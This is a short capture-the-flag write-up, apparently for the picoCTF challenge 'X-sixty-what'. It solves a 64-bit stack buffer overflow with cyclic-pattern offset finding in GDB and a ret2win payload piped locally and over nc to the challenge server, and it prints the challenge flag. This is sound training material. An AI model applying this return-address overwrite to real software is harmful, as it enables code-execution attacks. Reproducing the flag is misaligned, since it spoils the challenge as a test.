# Exp

# Flag: picoCTF{b1663r_15_b3773r_be31178c}

```
checksec vuln
[*] '/home/user/picoCTF/X-sixty-what/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

msf-pattern_create -l 400                      
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

In GDB
RBP: 0x3363413263413163 ('c1Ac2Ac3')

msf-pattern_offset -l 400 -q 0x3363413263413163
[*] Exact match at offset 64

gdb > info functions
0x0000000000401236 flag

python2.7 -c "print('A' * 72 + '\x36\x12\x40\x00\x00\x00\x00\x00')" | ./vuln



gdb-peda$ i f
Stack level 0, frame at 0x7fffffffde28:
 rip = 0x4012d1 in vuln; saved rip = 0x6341356341346341


msf-pattern_offset -l 400 -q 0x6341356341346341
[*] Exact match at offset 72


# Works locally
python  -c "print((b'A'*72 + b'\x00\x00\x00\x00\x40\x12\x36'[::-1]).decode())" | ./vuln

# Works remotely
## Hint: Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.
python  -c "print((b'A'*72 + b'\x00\x00\x00\x00\x40\x12\x3b'[::-1]).decode())" | nc saturn.picoctf.net 58459
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_be31178c}